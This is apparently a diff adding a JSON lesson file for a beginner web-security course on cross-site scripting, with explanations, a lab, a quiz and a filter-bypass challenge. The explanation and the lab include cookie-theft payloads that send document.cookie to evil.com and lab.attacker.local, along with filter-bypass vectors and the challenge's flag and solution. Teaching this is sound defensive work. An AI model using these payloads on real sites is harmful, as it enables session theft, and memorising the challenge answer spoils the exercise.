@@ -1,0 +1,361 @@
+{
+  "id": "lesson-xss-intro",
+  "slug": "lesson-02-xss",
+  "courseSlug": "web-security-fundamentals",
+  "moduleId": "module-web-attacks",
+  "title": "Cross-Site Scripting (XSS)",
+  "tagline": "How attackers run their JavaScript inside your users' browsers",
+  "description": "XSS is the most prevalent web vulnerability class. Learn the three types (reflected, stored, DOM-based), execute real attacks in a safe lab, and implement Content Security Policy to block them.",
+  "difficulty": "beginner",
+  "estimatedMinutes": 40,
+  "tags": ["xss", "javascript", "dom", "web", "client-side", "owasp"],
+  "prerequisites": ["lesson-01-sql-injection"],
+  "learningObjectives": [
+    "Distinguish between reflected, stored, and DOM-based XSS",
+    "Execute a stored XSS payload in a safe lab environment",
+    "Understand why output encoding prevents XSS",
+    "Configure a basic Content Security Policy header",
+    "Identify XSS sinks and sources in JavaScript code"
+  ],
+  "version": "1.0.0",
+  "author": "Cyber Learn Team",
+  "createdAt": "2024-01-20T00:00:00Z",
+  "updatedAt": "2024-09-10T00:00:00Z",
+  "order": 2,
+  "xpReward": 400,
+  "prevLessonSlug": "lesson-01-sql-injection",
+  "sections": [
+    {
+      "id": "hook-xss",
+      "type": "hook",
+      "sidebarLabel": "The Hook",
+      "estimatedMinutes": 1,
+      "variant": "statistic",
+      "headline": "XSS attacks can silently steal your session cookie and log attackers in as you.",
+      "subheadline": "Cross-Site Scripting is the #1 most reported vulnerability class on HackerOne — and 99% of web developers have written vulnerable code without knowing it.",
+      "stat": {
+        "value": "#1",
+        "label": "Most reported bug class on HackerOne",
+        "source": "HackerOne Bug Bounty Report 2023"
+      },
+      "backgroundAccent": "orange"
+    },
+
+    {
+      "id": "story-xss",
+      "type": "story",
+      "sidebarLabel": "The Samy Worm",
+      "estimatedMinutes": 2,
+      "mood": "discovery",
+      "narrative": [
+        "October 4, 2005. Samy Kamkar is a 19-year-old with a simple goal: he wants more MySpace friends. He notices that MySpace lets users customize their profiles with HTML — but the security filters are imperfect.",
+        "Samy writes a tiny piece of JavaScript that does two things when executed: it adds him as a friend and it copies itself to the viewer's profile. Every person who views an infected profile gets infected — and infects everyone who views theirs.",
+        "Within 20 hours, Samy has over one million friend requests. MySpace is forced to take the entire site offline. The worm, later named the Samy Worm, became the fastest-spreading malware in history at the time.",
+        "Samy had accidentally demonstrated that a single XSS vulnerability can turn every user of a platform into an unwitting attacker. The technique he used — stored XSS — is still one of the most dangerous vulnerability classes today."
+      ],
+      "characters": [
+        {
+          "name": "Samy Kamkar",
+          "role": "Researcher / Attacker",
+          "description": "19-year-old who unintentionally created the fastest-spreading web worm of its time. Later became a respected security researcher.",
+          "emoji": "👦"
+        },
+        {
+          "name": "MySpace",
+          "role": "Vulnerable Platform",
+          "description": "The largest social network of 2005, with imperfect HTML sanitization that allowed JavaScript injection through user profiles.",
+          "emoji": "🌐"
+        }
+      ],
+      "quote": {
+        "text": "I just wanted more friends on MySpace. I accidentally created the fastest-spreading virus of all time.",
+        "attribution": "Samy Kamkar"
+      }
+    },
+
+    {
+      "id": "objectives-xss",
+      "type": "objectives",
+      "sidebarLabel": "What You'll Learn",
+      "estimatedMinutes": 1,
+      "objectives": [
+        "Distinguish between reflected, stored, and DOM-based XSS",
+        "Execute a stored XSS payload in a safe lab environment",
+        "Understand why output encoding prevents XSS",
+        "Configure a basic Content Security Policy header",
+        "Identify XSS sinks and sources in JavaScript code"
+      ],
+      "xpPreview": {
+        "base": 200,
+        "bonuses": [
+          { "label": "Complete hands-on lab", "amount": 80 },
+          { "label": "Pass the quiz (70%+)",  "amount": 60 },
+          { "label": "Solve the challenge",   "amount": 60 }
+        ]
+      }
+    },
+
+    {
+      "id": "explanation-xss",
+      "type": "explanation",
+      "sidebarLabel": "How XSS Works",
+      "estimatedMinutes": 6,
+      "content": [
+        "## What is Cross-Site Scripting?",
+        "",
+        "Cross-Site Scripting (XSS) occurs when an application takes **untrusted user input and includes it in a web page without proper encoding** — allowing an attacker's JavaScript to execute in victims' browsers.",
+        "",
+        "The key insight: the browser **cannot distinguish between legitimate JavaScript served by the app and injected JavaScript from an attacker**. If the attacker's code lands in the page, the browser runs it with full trust.",
+        "",
+        "## The Three Types of XSS",
+        "",
+        "### 1. Reflected XSS",
+        "The malicious script comes from the current HTTP request. The server 'reflects' it back in the response.",
+        "",
+        "```",
+        "URL: https://example.com/search?q=<script>alert(1)</script>",
+        "```",
+        "",
+        "If the search page outputs the query parameter unencoded, the script executes. The attacker tricks victims into clicking a crafted link.",
+        "",
+        "### 2. Stored XSS",
+        "The malicious script is **permanently stored** on the server (in a database, comment field, user profile). It executes for every user who loads the page. This is the most dangerous type.",
+        "",
+        "### 3. DOM-Based XSS",
+        "The vulnerability exists in client-side JavaScript. The page reads from a dangerous **source** (URL fragment, window.name) and writes to a dangerous **sink** (innerHTML, eval).",
+        "",
+        "```javascript",
+        "// Dangerous — never do this",
+        "const search = location.hash.slice(1);",
+        "document.getElementById('output').innerHTML = search;  // XSS sink!",
+        "```",
+        "",
+        "## What Can XSS Do?",
+        "",
+        "An XSS payload runs in the victim's browser with full JavaScript privileges:",
+        "- **Steal session cookies** → log in as the victim",
+        "- **Keylog everything** → capture passwords as they're typed",
+        "- **Redirect to phishing pages** → fake login forms",
+        "- **Modify the page content** → defacement or misinformation",
+        "- **Make requests on behalf of the victim** → CSRF-style attacks"
+      ],
+      "callouts": [
+        {
+          "type": "danger",
+          "title": "HttpOnly cookies are not enough",
+          "text": "While HttpOnly prevents JavaScript from reading cookies directly, XSS can still make authenticated HTTP requests on the victim's behalf — effectively performing actions as the logged-in user."
+        },
+        {
+          "type": "tip",
+          "title": "The fix: output encoding",
+          "text": "Always encode user-controlled data before inserting it into HTML. Use your framework's built-in encoding: React's JSX, Django's {{ var }}, Angular's {{ var }}. Never use innerHTML with user data."
+        }
+      ],
+      "codeBlocks": [
+        {
+          "language": "html",
+          "caption": "Vulnerable — raw output in template",
+          "code": [
+            "<!-- ⛔ Vulnerable: PHP without htmlspecialchars -->",
+            "<h1>Hello, <?= $_GET['name'] ?>!</h1>",
+            "",
+            "<!-- Attacker visits: /page?name=<script>document.location='https://evil.com?c='+document.cookie</script> -->"
+          ]
+        },
+        {
+          "language": "html",
+          "caption": "Safe — output encoding",
+          "code": [
+            "<!-- ✅ Safe: use htmlspecialchars in PHP -->",
+            "<h1>Hello, <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?>!</h1>",
+            "",
+            "<!-- Or in React (safe by default): -->",
+            "<h1>Hello, {name}!</h1>  {/* React encodes this automatically */}"
+          ]
+        }
+      ],
+      "analogy": {
+        "scenario": "Imagine a notice board at a library. Anyone can pin a note. The librarian reads every note aloud to all visitors. An attacker pins a note that says 'say FIRE and everyone must leave'.",
+        "mapping": "Stored XSS works the same way — the attacker's script is stored in the server (the notice board), and executed in every visitor's browser (read aloud to everyone). Output encoding is like the librarian reading the note literally instead of following its instructions."
+      },
+      "keyTerms": [
+        { "term": "XSS Sink",          "definition": "A JavaScript function or property that renders HTML or executes code: innerHTML, document.write, eval, setTimeout with strings." },
+        { "term": "XSS Source",         "definition": "Where attacker-controlled data enters the page: location.hash, URL parameters, cookies, postMessage, window.name." },
+        { "term": "Output Encoding",    "definition": "Converting special characters (&, <, >, \", ') into their HTML entity equivalents so the browser renders them as text, not markup." },
+        { "term": "Content Security Policy", "definition": "An HTTP response header that tells the browser which scripts are allowed to run. Blocks XSS even if injection occurs." }
+      ]
+    },
+
+    {
+      "id": "diagram-xss",
+      "type": "diagram",
+      "sidebarLabel": "Attack Diagram",
+      "estimatedMinutes": 2,
+      "title": "Stored XSS Attack Flow",
+      "description": "How stored XSS moves from the attacker's input to the victim's browser — passing through the server's database.",
+      "nodes": [
+        { "id": "attacker", "label": "Attacker",    "type": "attacker",  "detail": "Posts comment with <script>...</script>" },
+        { "id": "server",   "label": "Web Server",  "type": "server",    "detail": "Stores raw HTML in database without sanitization" },
+        { "id": "db",       "label": "Database",    "type": "database",  "detail": "Stores malicious script as a comment" },
+        { "id": "victim",   "label": "Victim",      "type": "client",    "detail": "Loads the page, browser runs the injected script" },
+        { "id": "evil",     "label": "Evil Server", "type": "default",   "detail": "Receives stolen session cookie" }
+      ],
+      "edges": [
+        { "from": "attacker", "to": "server", "label": "POST /comment with script", "type": "attack" },
+        { "from": "server",   "to": "db",     "label": "INSERT raw HTML",           "type": "attack" },
+        { "from": "victim",   "to": "server", "label": "GET /comments",             "type": "normal" },
+        { "from": "server",   "to": "victim", "label": "HTML with injected script", "type": "attack", "animated": true },
+        { "from": "victim",   "to": "evil",   "label": "Sends cookie to attacker",  "type": "attack", "animated": true }
+      ],
+      "caption": "The attacker sets the trap; every victim who loads the page triggers it"
+    },
+
+    {
+      "id": "practical-xss",
+      "type": "practical",
+      "sidebarLabel": "Hands-On Lab",
+      "estimatedMinutes": 8,
+      "objective": "Execute a stored XSS attack that steals a session cookie, then fix the vulnerability.",
+      "practicalType": "browser",
+      "difficulty": "beginner",
+      "safetyNotice": "Only practice XSS in authorized lab environments. Unauthorized XSS is a serious crime under computer fraud laws in every jurisdiction.",
+      "prerequisites": ["Complete the SQL injection lesson", "Basic understanding of HTML and JavaScript"],
+      "steps": [
+        {
+          "id": "xss-step-1",
+          "title": "Navigate to the comment section",
+          "description": "Open the lab environment and go to the blog post comment section. This simulates a real blog where users can leave comments.",
+          "expectedOutput": "You see a comment form with a text area"
+        },
+        {
+          "id": "xss-step-2",
+          "title": "Post a normal comment (observe behavior)",
+          "description": "Type 'Hello world' as a comment and submit. Note that your comment appears immediately on the page.",
+          "expectedOutput": "Your comment 'Hello world' appears on the page"
+        },
+        {
+          "id": "xss-step-3",
+          "title": "Inject the XSS payload",
+          "description": "Post the following as a comment. When the page reloads, you should see an alert box containing your session cookie.",
+          "command": "<script>alert(document.cookie)</script>",
+          "expectedOutput": "An alert box appears showing your session cookie value"
+        },
+        {
+          "id": "xss-step-4",
+          "title": "Simulate cookie theft",
+          "description": "Now submit this payload to silently send the cookie to an attacker's server (the lab captures this for you).",
+          "command": "<script>new Image().src='http://lab.attacker.local/steal?c='+document.cookie</script>",
+          "expectedOutput": "The lab console shows: COOKIE RECEIVED: session=abc123def456"
+        },
+        {
+          "id": "xss-step-5",
+          "title": "Apply the fix",
+          "description": "Click 'Enable Output Encoding' in the lab. Resubmit the XSS payload. Observe that it now appears as literal text, not executed code.",
+          "expectedOutput": "The script appears as text: <script>alert(document.cookie)</script>"
+        }
+      ],
+      "hints": [
+        "Start with <script>alert(1)</script> — if an alert appears, the page is vulnerable.",
+        "Many filters block <script> but miss other vectors like <img src=x onerror=alert(1)>.",
+        "document.cookie gives you the current page's cookies. A real attacker sends these to their server."
+      ],
+      "expectedResult": "Successfully inject a script that alerts the cookie value, then verify the fix prevents execution.",
+      "solution": "The fix requires passing all user input through htmlspecialchars() in PHP (or equivalent in your language) before rendering it in HTML. This converts < to &lt; so the browser treats it as text, not a tag."
+    },
+
+    {
+      "id": "quiz-xss",
+      "type": "quiz",
+      "sidebarLabel": "Quiz",
+      "estimatedMinutes": 4,
+      "passingScore": 70,
+      "questions": [
+        {
+          "id": "xq1",
+          "type": "single",
+          "question": "Which type of XSS is most dangerous and why?",
+          "options": [
+            { "id": "a", "text": "Reflected XSS — because it runs immediately", "isCorrect": false },
+            { "id": "b", "text": "Stored XSS — because it persists and affects every user who loads the page", "isCorrect": true },
+            { "id": "c", "text": "DOM XSS — because it requires no server involvement", "isCorrect": false },
+            { "id": "d", "text": "All types are equally dangerous", "isCorrect": false }
+          ],
+          "explanation": "Stored XSS is the most dangerous because the malicious payload is saved in the server's database and executes for every user who loads the infected page — making it a force multiplier for the attacker."
+        },
+        {
+          "id": "xq2",
+          "type": "single",
+          "question": "A React developer uses dangerouslySetInnerHTML to display a user's bio. Is this safe?",
+          "options": [
+            { "id": "a", "text": "Yes — React automatically sanitizes all HTML", "isCorrect": false },
+            { "id": "b", "text": "No — dangerouslySetInnerHTML bypasses React's XSS protection and executes raw HTML", "isCorrect": true },
+            { "id": "c", "text": "Yes — dangerouslySetInnerHTML strips all script tags", "isCorrect": false },
+            { "id": "d", "text": "It depends on the React version", "isCorrect": false }
+          ],
+          "explanation": "dangerouslySetInnerHTML is explicitly named 'dangerous' because it bypasses React's automatic encoding and injects raw HTML directly into the DOM. If user input reaches dangerouslySetInnerHTML without sanitization, it's a stored XSS vulnerability."
+        },
+        {
+          "id": "xq3",
+          "type": "true-false",
+          "question": "Setting the HttpOnly flag on a session cookie completely prevents XSS from causing harm.",
+          "options": [
+            { "id": "true",  "text": "True",  "isCorrect": false },
+            { "id": "false", "text": "False", "isCorrect": true  }
+          ],
+          "explanation": "HttpOnly prevents JavaScript from directly reading the cookie — but XSS can still make authenticated AJAX requests, redirect users, capture keystrokes, and modify page content. The only real XSS prevention is output encoding and Content Security Policy."
+        }
+      ]
+    },
+
+    {
+      "id": "challenge-xss",
+      "type": "challenge",
+      "sidebarLabel": "Challenge",
+      "estimatedMinutes": 5,
+      "title": "Bypass the XSS Filter",
+      "description": "The lab has a naive XSS filter that blocks <script> tags. Find an alternative payload that bypasses the filter and displays an alert. The flag is the alert text.",
+      "challengeType": "flag-capture",
+      "difficulty": "beginner",
+      "xpReward": 60,
+      "flagFormat": "FLAG{...}",
+      "flag": "FLAG{xss_filter_bypass}",
+      "maxAttempts": 5,
+      "hints": [
+        "Try event handlers on HTML elements: <img src=x onerror=...>",
+        "What about <svg> elements? They have their own event handlers.",
+        "What does the filter do when you use uppercase? Try <SCRIPT> or <ScRiPt>."
+      ],
+      "solution": "Use an img onerror payload: <img src=x onerror=\"alert('FLAG{xss_filter_bypass}')\"> — the filter only blocks lowercase <script> tags but misses event handlers."
+    },
+
+    {
+      "id": "summary-xss",
+      "type": "summary",
+      "sidebarLabel": "Summary",
+      "estimatedMinutes": 2,
+      "keyTakeaways": [
+        "XSS lets attackers run JavaScript in victims' browsers — stealing cookies, capturing keystrokes, and making requests as the victim",
+        "Three types: Reflected (link-based), Stored (database-persistent), DOM-based (client-side JS sinks)",
+        "The root cause is mixing untrusted data with HTML without encoding",
+        "Output encoding is the primary defense — always encode before rendering user data in HTML",
+        "Content Security Policy adds a second layer that blocks script execution even if injection occurs",
+        "HttpOnly protects cookies but doesn't stop XSS from doing harm"
+      ],
+      "xpBreakdown": {
+        "base": 200,
+        "activityBonus": 80,
+        "challengeBonus": 60,
+        "quizBonus": 60,
+        "streakMultiplier": 1.0,
+        "total": 400
+      },
+      "relatedTopics": [
+        "Content Security Policy (CSP)",
+        "DOM Clobbering",
+        "XSS in React / Angular / Vue",
+        "Template Injection",
+        "OWASP Testing Guide — A07"
+      ]
+    }
+  ]
+}
